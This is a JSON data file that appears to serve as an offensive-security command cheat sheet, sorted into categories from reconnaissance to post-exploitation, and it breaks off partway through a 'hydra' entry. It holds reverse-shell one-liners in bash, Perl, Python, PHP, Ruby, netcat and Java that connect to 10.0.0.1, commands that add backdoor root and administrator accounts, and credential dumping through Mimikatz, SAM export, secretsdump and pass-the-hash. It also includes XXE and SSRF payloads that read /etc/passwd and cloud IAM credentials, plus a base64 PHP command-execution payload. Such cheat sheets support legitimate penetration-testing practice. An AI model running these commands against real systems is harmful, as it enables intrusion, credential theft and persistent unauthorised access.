{
  "Version": "0.0.0.1",
  "Categories": [
    {
      "id": 0,
      "Name": "Passive Mapping"
    },
    {
      "id": 1,
      "Name": "Application Analysis"
    },
    {
      "id": 2,
      "Name": "Web App Testing"
    },
    {
      "id": 3,
      "Name": "Interactive Mapping"
    },
    {
      "id": 4,
      "Name": "Webserver Scanning"
    },
    {
      "id": 5,
      "Name": "Vuln Scanning"
    },
    {
      "id": 6,
      "Name": "Subdomain"
    },
    {
      "id": 7,
      "Name": "Server Service Scanning"
    },
    {
      "id": 8,
      "Name": "Initial Access"
    },
    {
      "id": 9,
      "Name": "Post Exploitation"
    },
    {
      "id": 10,
      "Name": "Reverse Shells"
    },
    {
      "id": 11,
      "Name": "Spawn TTY Shell"
    },
    {
      "id": 12,
      "Name": "LDAP"
    },
    {
      "id": 13,
      "Name": "Cracking"
    },
    {
      "id": 14,
      "Name": "Misc Linux"
    },
    {
      "id": 15,
      "Name": "Powershell"
    },
    {
      "id": 16,
      "Name": "Mimikatz"
    },
    {
      "id": 17,
      "Name": "Misc Windows"
    }
  ],
  "commands": [
    {
      "Name": "Check User ID",
      "Category": 9,
      "Description": "Enumerate current user ID, groups, and privileges to identify initial access level and potential escalation paths in a compromised Linux environment.",
      "Command": "id"
    },
    {
      "Name": "Get Hostname",
      "Category": 0,
      "Description": "Retrieve the system's hostname for mapping the target during initial reconnaissance in privilege escalation assessments.",
      "Command": "hostname"
    },
    {
      "Name": "Read Issue Banner",
      "Category": 0,
      "Description": "Display the login banner from /etc/issue to gather OS and environment details passively for targeted Linux priv-esc planning.",
      "Command": "cat /etc/issue"
    },
    {
      "Name": "OS Release Info",
      "Category": 0,
      "Description": "Extract distribution and version information from /etc/os-release to identify potential vulnerabilities and exploit compatibility in Linux systems.",
      "Command": "cat /etc/os-release"
    },
    {
      "Name": "Kernel Details",
      "Category": 0,
      "Description": "Output kernel version, architecture, and build details via uname to scout for known kernel exploits during passive mapping.",
      "Command": "uname -a"
    },
    {
      "Name": "Process List",
      "Category": 7,
      "Description": "List all running processes with user details to identify running services, potential injection points, and privilege mismatches for escalation.",
      "Command": "ps aux"
    },
    {
      "Name": "Route List",
      "Category": 3,
      "Description": "Display routing table interactively to map network topology and identify lateral movement opportunities in a Linux target.",
      "Command": "routel"
    },
    {
      "Name": "IP Addresses",
      "Category": 3,
      "Description": "Enumerate all network interfaces and IP configurations for interactive network mapping and pivot identification in priv-esc chains.",
      "Command": "ip a"
    },
    {
      "Name": "Socket Status",
      "Category": 7,
      "Description": "Scan active network sockets and associated processes to detect listening services and connections for service enumeration in escalation.",
      "Command": "ss -anp"
    },
    {
      "Name": "IPTables Rules",
      "Category": 14,
      "Description": "Dump IPv4 firewall rules to assess network restrictions and potential bypasses in a Linux post-exploitation scenario.",
      "Command": "cat /etc/iptables/rules.v4"
    },
    {
      "Name": "Cron Directories",
      "Category": 9,
      "Description": "List cron job directories and files to uncover scheduled tasks that may allow privilege escalation via writable cron entries.",
      "Command": "ls -lah /etc/cron*"
    },
    {
      "Name": "User Crontab",
      "Category": 9,
      "Description": "Display current user's crontab entries to identify automated jobs exploitable for persistent or elevated access in Linux environments.",
      "Command": "crontab -l"
    },
    {
      "Name": "Installed Packages",
      "Category": 1,
      "Description": "List all installed Debian packages to analyze application versions for known vulnerabilities in priv-esc reconnaissance.",
      "Command": "dpkg -l"
    },
    {
      "Name": "Writable Dirs",
      "Category": 9,
      "Description": "Find world-writable directories across the filesystem to locate upload points for malicious payloads in post-exploitation.",
      "Command": "find / -writable -type d 2>/dev/null"
    },
    {
      "Name": "Mount Points",
      "Category": 9,
      "Description": "Examine filesystem mount table to identify mounted volumes, shares, and potential noexec bypasses for escalation techniques.",
      "Command": "cat /etc/fstab"
    },
    {
      "Name": "Block Devices",
      "Category": 9,
      "Description": "List block devices and partitions to map storage layout and detect encrypted or hidden volumes in Linux priv-esc.",
      "Command": "lsblk"
    },
    {
      "Name": "Loaded Modules",
      "Category": 9,
      "Description": "Enumerate loaded kernel modules to spot drivers vulnerable to exploits or version-specific weaknesses.",
      "Command": "lsmod"
    },
    {
      "Name": "Module Info",
      "Category": 14,
      "Description": "Query details on the libata kernel module to assess for storage-related exploits in targeted priv-esc paths.",
      "Command": "/sbin/modinfo libata"
    },
    {
      "Name": "SUID Binaries",
      "Category": 9,
      "Description": "Locate setuid executables system-wide to identify privilege escalation vectors via misconfigured SUID files.",
      "Command": "find / -perm -u=s -type f 2>/dev/null"
    },
    {
      "Name": "Environment Vars",
      "Category": 9,
      "Description": "Dump environment variables to reveal paths, credentials, or configs exploitable for further escalation in Linux shells.",
      "Command": "env"
    },
    {
      "Name": "Sudo Permissions",
      "Category": 8,
      "Description": "List allowed sudo commands to scout for misconfigurations enabling initial privilege escalation attempts.",
      "Command": "sudo -l"
    },
    {
      "Name": "Root Shell",
      "Category": 8,
      "Description": "Attempt interactive root shell via sudo for direct privilege escalation if permissions allow.",
      "Command": "sudo -i"
    },
    {
      "Name": "Monitor Processes",
      "Category": 9,
      "Description": "Continuously watch processes for user related activity during post-exploitation sniffing.",
      "Command": "watch -n 1 \"ps -aux | grep '\\['\""
    },
    {
      "Name": "Sniff Loopback",
      "Category": 9,
      "Description": "Use sudo to capture and grep loopback traffic for plaintext passwords in local inter-process communications.",
      "Command": "sudo tcpdump -i lo -A | grep \"pass\""
    },
    {
      "Name": "Cron Logs",
      "Category": 9,
      "Description": "Search syslog for cron execution logs to correlate scheduled jobs with potential escalation timestamps.",
      "Command": "grep \"CRON\" /var/log/syslog"
    },
    {
      "Name": "Add Backdoor User",
      "Category": 9,
      "Description": "Append a new root-equivalent user to /etc/passwd for persistent backdoor access post-privilege escalation.",
      "Command": "echo \"mrtheplague:$(openssl passwd x): 0: 0:root:/root:/bin/bash\" >> /etc/passwd"
    },
    {
      "Name": "File Capabilities",
      "Category": 9,
      "Description": "Recursively enumerate file capabilities to uncover binaries with elevated privileges without traditional SUID.",
      "Command": "/usr/sbin/getcap -r / 2>/dev/null"
    },
    {
      "Name": "Kernel Version",
      "Category": 0,
      "Description": "Extract kernel release version for passive identification of exploitable kernel flaws in Linux mapping.",
      "Command": "uname -r"
    },
    {
      "Name": "System Arch",
      "Category": 0,
      "Description": "Determine system architecture to tailor exploits and payloads for architecture-specific vulnerabilities.",
      "Command": "arch"
    },
    {
      "Name": "File Type Check",
      "Category": 14,
      "Description": "Identify file type of a test file to verify binaries or scripts for exploitation in misc Linux priv-esc tasks.",
      "Command": "file test-file"
    },
    {
      "Name": "Reg",
      "Category": 17,
      "Description": "Save SAM and SYSTEM files",
      "Command": "reg save HKLM\\sam sam2 &&  reg save HKLM\\system system2"
    },
    {
      "Name": "SC",
      "Category": 17,
      "Description": "List all services that aren't in the System32 directory",
      "Command": "for /f \"tokens=2 delims=: \" %s in ('sc query state^= all ^| find \"SERVICE_NAME\"') do @sc qc \"%s\" | find \"BINARY_PATH_NAME\" | findstr /v /i \"System32\""
    },
    {
      "Name": "NET",
      "Category": 17,
      "Description": "Create a windows backdoor admin account",
      "Command": "ett user mrtheplague 'password1234!!' /add; net localgroup Administrators mrtheplague /add"
    },
    {
      "Name": "SCHTASKS",
      "Category": 17,
      "Description": "List all scheduled tasks that have executables under C:\\Users*",
      "Command": "schtasks /query /fo CSV /v | ConvertFrom-Csv | Where-Object { $_.\"Task To Run\" -Like \"C:\\Users*\" -and $_.\"TaskName\" -ne \"\" -and $_.\"TaskName\" -ne \"TaskName\" }"
    },
    {
      "Name": "WMIC",
      "Category": 17,
      "Description": "List all services that have unquoted paths",
      "Command": "wmic service get name,pathname |  Select-string -NotMatch \"Windows\" | Select-string -NotMatch -Pattern '\"' | Where-Object {  -not [String]::IsNullOrEmpty($_) }'"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Download file to windows",
      "Command": "iwr -uri http://192.168.48.3/file.ps1 -Outfile file"
    },
    {
      "Name": "Certutil",
      "Category": 17,
      "Description": "Download file to windows",
      "Command": "certutil -UrlCache -f http://host.com/file .\\file"
    },
    {
      "Name": "NetStat",
      "Category": 17,
      "Description": "List all active network connections and listening ports",
      "Command": "netstat -ano"
    },
    {
      "Name": "Route",
      "Category": 17,
      "Description": "Display the routing table, which contains all routes of the system",
      "Command": "route print"
    },
    {
      "Name": "SystemInfo",
      "Category": 17,
      "Description": "Display windows system information",
      "Command": "systeminfo"
    },
    {
      "Name": "Impacket-secretsdump ",
      "Category": 9,
      "Description": "Dump hashes from sam and system files",
      "Command": "impacket-secretsdump -sam sam -system system local"
    },
    {
      "Name": "Impacket-ntlmrelayx",
      "Category": 9,
      "Description": "Execute ntlm smb relay attack",
      "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.213.211 -c 'your windows command'"
    },
    {
      "Name": "Impacket-psexec",
      "Category": 9,
      "Description": "Execute psexec on remote machine using NTLM hash",
      "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.168.213.212"
    },
    {
      "Name": "Mimikatz",
      "Category": 16,
      "Description": "Elevate to SYSTEM user privileges",
      "Command": "token::elevate"
    },
    {
      "Name": "Mimikatz",
      "Category": 16,
      "Description": "Enable SeDebugPrivilege access right",
      "Command": "privilege::debug"
    },
    {
      "Name": "Mimikatz",
      "Category": 16,
      "Description": "Extract the NTLM hashes from the SAM",
      "Command": "lsadump::sam"
    },
    {
      "Name": "Mimikatz",
      "Category": 16,
      "Description": "Attempts to extract plaintext passwords and password hashes from all available sources",
      "Command": "sekurlsa::logonpasswords"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Get Local Users on Windows",
      "Command": "Get-LocalUser"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Get Computer Info on Windows",
      "Command": "Get-ComputerInfo"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Get Group Info on Windows",
      "Command": "Get-LocalGroup"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Get Group Member Info on Windows",
      "Command": "Get-LocalGroupMember 'Group Name'"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "List all installed 32bit applications",
      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "List all installed 64bit applications",
      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "List all running processes executable paths",
      "Command": "(Get-Process).Path"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "List all running processes",
      "Command": "Get-Process"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Show powershell history for current user",
      "Command": "Get-History"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Show powershell history file path",
      "Command": "(Get-PSReadlineOption).HistorySavePath"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Recursive powershell search by wildcard for extension kdbx",
      "Command": "Get-ChildItem -Path c:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Search windows events by event ID",
      "Command": "Get-WinEvent -FilterHashtable @{LogName = '*'; Id = 4104} | Select-Object -ExpandProperty Message"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Grep powershell command output",
      "Command": "Select-String -Pattern 'search term'"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Recursive powershell search by wildcard for common extensions",
      "Command": "Get-ChildItem -Path c:\\ -Include *.txt,*.pdf,*.xls,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Search for all services, running and stopped, that don't have system32 in the path",
      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike \"*system32*\"}"
    },
    {
      "Name": "Powershell",
      "Category": 15,
      "Description": "Search for running services that don't have system32 in the path",
      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike \"*system32*\"}"
    },
    {
      "Name": "Powershell",
      "Category": 7,
      "Description": "Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell",
      "Command": "Test-NetConnection -Port 25 192.168.50.8"
    },
    {
      "Name": "SystemCTL",
      "Category": 9,
      "Description": "Starts a specified service using systemctl",
      "Command": "sudo systemctl start servicename"
    },
    {
      "Name": "Nmap",
      "Category": 5,
      "Description": "Performs vulnerability scan on ports 80 and 443 of 192.168.192.13 using Nmap scripts",
      "Command": "nmap --script vuln -p 80,443 192.168.192.13"
    },
    {
      "Name": "PHP Filter Base64 Payload",
      "Category": 2,
      "Description": "Uses PHP filter to encode a resource in base64, potentially for data exfiltration",
      "Command": "php://filter/convert.base64-encode/resource="
    },
    {
      "Name": "Data URI Command Execution",
      "Category": 2,
      "Description": "Executes a base64-encoded PHP payload via data URI to run system command 'uname -a'",
      "Command": "data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a"
    },
    {
      "Name": "Python HTTP Server",
      "Category": 14,
      "Description": "Creates a simple python http server on port 80",
      "Command": "python3 -m http.server 80 "
    },
    {
      "Name": "Nmap UDP SNMP Scan",
      "Category": 7,
      "Description": "Scans for open UDP port 161 (SNMP) across 192.168.50.1-254, saving results to open-snmp.txt",
      "Command": "sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt"
    },
    {
      "Name": "Onesixtyone SNMP Brute Force",
      "Category": 7,
      "Description": "Performs SNMP community string brute-forcing using a community list against specified IPs",
      "Command": "onesixtyone -c community -i ips"
    },
    {
      "Name": "SNMPwalk Public Community",
      "Category": 7,
      "Description": "Enumerates SNMP data using public community string on 192.168.50.151 with SNMPv1",
      "Command": "snmpwalk -c public -v1 -t 10 192.168.50.151"
    },
    {
      "Name": "SNMPwalk LAN Manager Users",
      "Category": 7,
      "Description": "Enumerates LAN Manager user information via SNMP on 192.168.50.151 using OID 1.3.6.1.4.1.77.1.2.25",
      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25"
    },
    {
      "Name": "SNMPwalk Running Processes",
      "Category": 7,
      "Description": "Enumerates running processes via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.4.2.1.2",
      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2"
    },
    {
      "Name": "SNMPwalk Installed Software",
      "Category": 7,
      "Description": "Enumerates installed software via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.6.3.1.2",
      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2"
    },
    {
      "Name": "SNMPwalk TCP Connections",
      "Category": 7,
      "Description": "Enumerates TCP connections via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.6.13.1.3",
      "Command": "snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3"
    },
    {
      "Name": "Telnet SMTP Connect",
      "Category": 7,
      "Description": "Initiates a Telnet connection to port 25 (SMTP) on 192.168.50.8",
      "Command": "telnet 192.168.50.8 25"
    },
    {
      "Name": "Enable Telnet Client",
      "Category": 8,
      "Description": "Enables the Telnet Client feature on a Windows system using DISM",
      "Command": "dism /online /Enable-Feature /FeatureName:TelnetClient"
    },
    {
      "Name": "Netcat SMTP Connect",
      "Category": 7,
      "Description": "Establishes a connection to port 25 (SMTP) on 192.168.50.8 with verbose output",
      "Command": "nc -nv 192.168.50.8 25"
    },
    {
      "Name": "Enum4linux Multi-IP Scan",
      "Category": 7,
      "Description": "Runs enum4linux against a list of specified IPs in the 192.168.192.0/24 subnet",
      "Command": "for i in {254,152,151,149,23,22,21,20,17,15,14,13,12,11,8,9,6}; do enum4linux 192.168.192.$i ; done"
    },
    {
      "Name": "Enum4linux Verbose Scan",
      "Category": 7,
      "Description": "Runs enum4linux in verbose mode to show underlying commands",
      "Command": "enum4linux -v target-ip"
    },
    {
      "Name": "Enum4linux All Options",
      "Category": 7,
      "Description": "Runs all enum4linux options except dictionary-based share name guessing",
      "Command": "enum4linux -a target-ip"
    },
    {
      "Name": "Enum4linux User List",
      "Category": 7,
      "Description": "Lists usernames if the server allows (RestrictAnonymous = 0)",
      "Command": "enum4linux -U target-ip"
    },
    {
      "Name": "Enum4linux User List with Credentials",
      "Category": 7,
      "Description": "Lists all users using provided credentials, bypassing RestrictAnonymous",
      "Command": "enum4linux -u administrator -p password -U target-ip"
    },
    {
      "Name": "Enum4linux Default RID Scan",
      "Category": 7,
      "Description": "Pulls usernames from default RID range (500-550,1000-1050)",
      "Command": "enum4linux -r target-ip"
    },
    {
      "Name": "Enum4linux Custom RID Scan",
      "Category": 7,
      "Description": "Pulls usernames using a custom RID range (600-660)",
      "Command": "enum4linux -R 600-660 target-ip"
    },
    {
      "Name": "Enum4linux Group List",
      "Category": 7,
      "Description": "Lists groups, with optional username and password support",
      "Command": "enum4linux -G target-ip"
    },
    {
      "Name": "Enum4linux Share List",
      "Category": 7,
      "Description": "Lists Windows shares, with optional username and password support",
      "Command": "enum4linux -S target-ip"
    },
    {
      "Name": "Enum4linux Share Dictionary Attack",
      "Category": 7,
      "Description": "Performs dictionary attack on shares if share list retrieval is blocked",
      "Command": "enum4linux -s shares.txt target-ip"
    },
    {
      "Name": "Enum4linux OS Info",
      "Category": 7,
      "Description": "Pulls OS information using smbclient, including service pack version",
      "Command": "enum4linux -o target-ip"
    },
    {
      "Name": "Enum4linux Printer Info",
      "Category": 7,
      "Description": "Pulls information about printers known to the target device",
      "Command": "enum4linux -i target-ip"
    },
    {
      "Name": "Net View Shares",
      "Category": 7,
      "Description": "Lists all shared resources on the target domain controller dc01",
      "Command": "net view \\dc01 /all"
    },
    {
      "Name": "Nmap SMB OS Discovery",
      "Category": 7,
      "Description": "Scans for SMB services on ports 139 and 445 with OS discovery script on a single host",
      "Command": "nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152"
    },
    {
      "Name": "NBTScan",
      "Category": 7,
      "Description": "Scans for NetBIOS information on the 192.168.50.0/24 network",
      "Command": "sudo nbtscan -r 192.168.50.0/24"
    },
    {
      "Name": "Nmap SMB Scan",
      "Category": 7,
      "Description": "Scans for SMB services on ports 139 and 445 across a subnet, saving output to smb.txt",
      "Command": "nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254"
    },
    {
      "Name": "Nmap SYN Scan",
      "Category": 7,
      "Description": "Port scanning with nmap",
      "Command": "nmap -sS 192.168.192.1"
    },
    {
      "Name": "Netcat Port Scan",
      "Category": 7,
      "Description": "Port scanning with netcat",
      "Command": "nc -nvv -w1 -z 192.168.192.151 1-1000"
    },
    {
      "Name": "Netcat UDP Port Scan",
      "Category": 7,
      "Description": "UDP Port scanning with netcat",
      "Command": "nc -nvv -u -w1 -z 192.168.192.151 150-200"
    },
    {
      "Name": "dnsenum",
      "Category": 0,
      "Description": "Attempts to retrieve the dns records for the given domain",
      "Command": "dnsenum domain.com"
    },
    {
      "Name": "Evil-WinRM",
      "Category": 8,
      "Description": "Attempts to connect to the windows remote management service",
      "Command": "evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p s3rvice"
    },
    {
      "Name": "Hashcrack",
      "Category": 13,
      "Description": "Runs the hashcat command against hashes.txt using the rockyou.txt file and applies the best64.rule transformations to it",
      "Command": "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
    },
    {
      "Name": "GetNPUsers - AS-REPRoast impacket-GetNPUsers",
      "Category": 12,
      "Description": "Attempts to enumerate and extract Kerberos AS-REP hashes for user accounts listed in the ./users file",
      "Command": "impacket-GetNPUsers FOREST.HTB/ -dc-ip 10.10.10.161 -usersfile ./users -request -format hashcat -outputfile hashes.txt"
    },
    {
      "Name": "LDAP Search get domain name with anonymous login",
      "Category": 12,
      "Description": "Get's the default naming context and displays the domain name",
      "Command": "ldapsearch -x -H ldap://10.10.10.161 -b \"\" -s base \"(objectClass=*)\" defaultNamingContext"
    },
    {
      "Name": "Python BASH TTY Shell",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Python",
      "Command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    },
    {
      "Name": "Python 3 BASH TTY Shell",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Python 3",
      "Command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    },
    {
      "Name": "Echo BASH TTY Shell",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using echo and os.system",
      "Command": "echo os.system('/bin/bash')"
    },
    {
      "Name": "BASH TTY Shell",
      "Category": 11,
      "Description": "Directly spawns an interactive BASH TTY shell",
      "Command": "/bin/bash -i"
    },
    {
      "Name": "Perl BASH TTY Shell",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Perl",
      "Command": "perl -e 'exec \"/bin/bash\";'"
    },
    {
      "Name": "Ruby BASH TTY Shell",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Ruby",
      "Command": "ruby -e 'exec \"/bin/bash\"'"
    },
    {
      "Name": "Lua BASH TTY Shell",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using Lua",
      "Command": "lua -e 'os.execute(\"/bin/bash\")'"
    },
    {
      "Name": "IRB BASH TTY Shell",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell using IRB",
      "Command": "exec \"/bin/bash\""
    },
    {
      "Name": "Vi/Vim BASH TTY Shell (Command 1)",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim",
      "Command": ":!bash"
    },
    {
      "Name": "Vi/Vim BASH TTY Shell (Command 2)",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim by setting shell",
      "Command": ":set shell=/bin/bash:shell"
    },
    {
      "Name": "Nano BASH TTY Shell",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell from within Nano editor",
      "Command": "CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0"
    },
    {
      "Name": "Nmap BASH TTY Shell",
      "Category": 11,
      "Description": "Spawns an interactive BASH TTY shell from within Nmap",
      "Command": "!bash"
    },
    {
      "Name": "Bash Reverse Shell",
      "Category": 10,
      "Description": "Creates a reverse shell using bash, tested on Ubuntu 10.10 checkout https://www.revshells.com for more robust shell creation",
      "Command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
    },
    {
      "Name": "Perl Reverse Shell",
      "Category": 10,
      "Description": "A short, feature-free Perl reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
      "Command": "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    },
    {
      "Name": "Python Reverse Shell",
      "Category": 10,
      "Description": "A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
      "Command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    },
    {
      "Name": "PHP Reverse Shell",
      "Category": 10,
      "Description": "A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed) checkout https://www.revshells.com for more robust shell creation",
      "Command": "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    },
    {
      "Name": "Ruby Reverse Shell",
      "Category": 10,
      "Description": "A Ruby reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
      "Command": "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    },
    {
      "Name": "Netcat Reverse Shell",
      "Category": 10,
      "Description": "A Netcat reverse shell, requires -e option support checkout https://www.revshells.com for more robust shell creation",
      "Command": "nc -e /bin/sh 10.0.0.1 1234"
    },
    {
      "Name": "Netcat FIFO Reverse Shell",
      "Category": 10,
      "Description": "An alternative Netcat reverse shell using FIFO for systems without -e option checkout https://www.revshells.com for more robust shell creation",
      "Command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
    },
    {
      "Name": "Java Reverse Shell",
      "Category": 10,
      "Description": "A Java reverse shell connecting to a specified IP and port (untested) checkout https://www.revshells.com for more robust shell creation",
      "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()"
    },
    {
      "Name": "Xterm Reverse Shell",
      "Category": 10,
      "Description": "An xterm reverse shell connecting to a specified IP on port 6001 checkout https://www.revshells.com for more robust shell creation",
      "Command": "xterm -display 10.0.0.1:1"
    },
    {
      "Name": "Xnest Setup",
      "Category": 10,
      "Description": "Starts an X-Server to catch incoming xterm on port 6001 (run on your system) checkout https://www.revshells.com for more robust shell creation",
      "Command": "Xnest :1"
    },
    {
      "Name": "Xhost Authorization",
      "Category": 10,
      "Description": "Authorizes the target to connect to your X-Server (run on your system)",
      "Command": "xhost +targetip"
    },
    {
      "Name": "Shodan",
      "Category": 0,
      "Description": "Search for company name and variations to look for nonstandard ports and outdated services",
      "Command": "https://www.shodan.io/"
    },
    {
      "Name": "sub3num",
      "Category": 0,
      "Description": "Tool for subdomain enumeration https://github.com/saharshtapi/sub3num",
      "Command": "./sub3num <target_domain>"
    },
    {
      "Name": "subfinder",
      "Category": 0,
      "Description": "Tool for discovering subdomains https://github.com/projectdiscovery/subfinder",
      "Command": "subfinder -d <target_domain>"
    },
    {
      "Name": "reconng",
      "Category": 0,
      "Description": "Tool for reconnaissance https://github.com/lanmaster53/recon-ng",
      "Command": "reconng"
    },
    {
      "Name": "GrayHat Warfare",
      "Category": 0,
      "Description": "Look for cloud buckets by company names and variations with bucket keywords",
      "Command": "https://grayhatwarfare.com/"
    },
    {
      "Name": "XXE",
      "Category": 2,
      "Description": "Test for XML External Entity vulnerabilities",
      "Command": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]> <vulnfield>$ent</vulnfield>"
    },
    {
      "Name": "XXE with SSRF",
      "Category": 2,
      "Description": "Retrieve data from internal EC2 instance using SSRF",
      "Command": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"
    },
    {
      "Name": "XXE Without Full Control",
      "Category": 2,
      "Description": "Include XXE in vulnerable field without full document control",
      "Command": "productId=1<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>&storeId=2"
    },
    {
      "Name": "XXE Embedded in Image",
      "Category": 2,
      "Description": "Embed XXE in an SVG image",
      "Command": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>"
    },
    {
      "Name": "gobuster",
      "Category": 3,
      "Description": "Directory busting tool",
      "Command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wfuzz/wordlist/general/megabeast.txt -o gobuster_results.txt"
    },
    {
      "Name": "ffuf",
      "Category": 3,
      "Description": "Directory busting with ffuf",
      "Command": "ffuf -u http://hostmaster.ghost.htb/FUZZ -w /usr/share/wordlists/wfuzz/general/megabeast.txt -mc 200,301,302"
    },
    {
      "Name": "wfuzz",
      "Category": 3,
      "Description": "Directory busting with wfuzz",
      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site/FUZZ"
    },
    {
      "Name": "wfuzz",
      "Category": 3,
      "Description": "File busting with extensions",
      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -z list,pdf,xls,txt,doc --hc 404 http://target-site/FUZZ.FUZ2Z"
    },
    {
      "Name": "nmap",
      "Category": 3,
      "Description": "Scan for open ports",
      "Command": "nmap -p- --open 10.10.10.11"
    },
    {
      "Name": "gobuster File",
      "Category": 3,
      "Description": "File busting with gobuster",
      "Command": "gobuster dir -u http://target-site.com -w /path/to/wordlist.txt -x php,json"
    },
    {
      "Name": "wfuzz File",
      "Category": 3,
      "Description": "File busting with wfuzz",
      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site.com/FUZZ.{php,json}"
    },
    {
      "Name": "ffuf File",
      "Category": 3,
      "Description": "File busting with ffuf",
      "Command": "ffuf -u http://target-site.com/FUZZ -w /path/to/wordlist.txt -e php,json -mc 200"
    },
    {
      "Name": "hydra",
      "Category": 4,
      "Description": "Brute force login attempts",
